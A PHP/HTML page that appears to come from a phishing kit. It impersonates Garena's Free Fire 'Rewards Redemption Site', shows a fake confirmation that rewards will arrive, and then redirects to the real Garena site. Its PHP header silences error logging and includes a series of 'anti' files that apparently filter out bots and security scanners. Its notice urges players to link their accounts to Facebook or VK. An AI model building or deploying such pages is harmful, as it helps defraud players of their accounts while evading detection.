<?php
session_start();

error_reporting(E_ERROR | E_WARNING | E_PARSE | E_NOTICE);
@ini_set('html_errors','0');
@ini_set('display_errors','0');
@ini_set('display_startup_errors','0');
@ini_set('log_errors','0');
include '../../prevents/anti1.php';
include '../../prevents/anti2.php';
include '../../prevents/anti3.php';
include '../../prevents/anti4.php';
include '../../prevents/anti5.php';
include '../../prevents/anti6.php';
include '../../prevents/anti7.php';
include '../../prevents/anti8.php';
include '../../prevents/9atila.php';

?>
<html lang="zh"><head>
    <meta http-equiv="refresh" content="3;url=https://ff.garena.com/" />
    <!-- M002 V3 -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <!-- set if need to be able scaled -->
    <meta name="description" content="">
    <meta name="author" content="">
    <meta name="title" content="FreeFire">
    <meta name="description" content="FreeFire">
    <meta property="og:title" content="FreeFire">
    <meta property="og:description" content="FreeFire">
    <title>Free Fire</title>
    <link rel="shortcut icon" href="https://ff.garena.tw/static/favicon.ico" type="image/x-icon">
    <link rel="stylesheet" href="css/reset.css">
    <!-- Bootstrap core CSS -->
    <link href="css/bootstrap.min.css" rel="stylesheet">
    <!-- IE10 viewport hack for Surface/desktop Windows 8 bug -->
    <link href="css/ie10-viewport-bug-workaround.css" rel="stylesheet">
    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
    <!--[if lt IE 9]>
      <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
      <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
    <![endif]-->
    <link href="css/all.css" rel="stylesheet">
    <link href="css/extra.css" rel="stylesheet">
    <!-- the css editable in USE -->
</head>

<body>

    <div class="container"><div class="a_wrap2"><div class="col-md-5 col-sm-5 col-xs-5"><img src="imgg/d85f60475e0b32c8a6fe3727e0042339.png" class="gamelogo"></div><div class="col-md-5 col-sm-5 col-xs-5"><img src="imgg/09ee8a84fbe87de1722947a0eec7df25.png" class="garenalogo"></div><span class="cit topics col-md-12 col-sm-12 col-xs-12">Rewards Redemption Site</span></div><div class="a_wrap"><div></div><br><div><div><center><span class="txt_c">Thank you for using our services.</span></center><br><center><span class=""><a href="https://ff.garena.com/" class="btn_valid"></a></span></center><br></div><center><span class="txt_c">You will be redirected in a few seconds...</span></center></div><span class="txt_c_1">Important Notice:</span><div class="more"><ol><li><!-- react-text: 19 -->1. the rewards may take some time <!-- /react-text --><!-- react-text: 21 -->to gain, Please be patience.<!-- /react-text --></li><li><!-- react-text: 23 -->2. Item rewards are shown in<!-- /react-text --><span class="colorUo">&nbsp;[vault]&nbsp;</span><!-- react-text: 25 -->tab in game lobby; Golds or diamonds will add in account wallet automatically.<!-- /react-text --></li><li>3. You only can get <span class="colorUo">1</span> reward per account.</li><li>3. Please note redemption expiration date. Any expired codes cannot be redeemed.</li><li>4. Please contact customer service if you encountered any issue.</li><li>5. Reminder: you will not be able to redeem your rewards with guest accounts. You may bind your account to Facebook or VK in order to receive the rewards.</li></ol></div></div></div></div>

<script type="text/javascript" src="js/bundle.js"></script>

</body></html>